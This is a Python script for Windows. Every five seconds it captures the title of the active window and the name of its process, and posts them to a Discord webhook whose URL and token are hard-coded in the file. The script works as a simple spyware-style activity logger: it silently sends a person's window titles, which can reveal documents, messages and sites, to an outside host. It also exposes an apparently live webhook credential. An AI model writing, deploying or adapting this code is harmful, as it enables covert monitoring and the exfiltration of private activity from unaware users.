import win32gui
import win32process
import psutil
import requests
import time

url = "https://discord.com/api/webhooks/1310921648391585802/xHRRU3TDvd3PNVsE6EF8eQfgHtXjoLzY6d-vpzs8jb4BF1CLnpw7cxvx0-Jtihwl5tTH"

def get_active_window():
    active_window = win32gui.GetForegroundWindow()
    window_title = win32gui.GetWindowText(active_window)
    return window_title

def get_active_process():
    active_window = win32gui.GetForegroundWindow()
    _,pid = win32process.GetWindowThreadProcessId(active_window)
    process = psutil.Process(pid)
    process_name = process.name()
    return process_name

def send_to_discord(window_title, process_name):
    data = {"content" : f"{window_title}\nActive Process: {process_name}"}
    requests.post(url, json=data)

def main():
    while True:
        time.sleep(5)
        active_window = get_active_window()
        active_process = get_active_process()
        send_to_discord(active_window, active_process)

if __name__ == '__main__':
    main()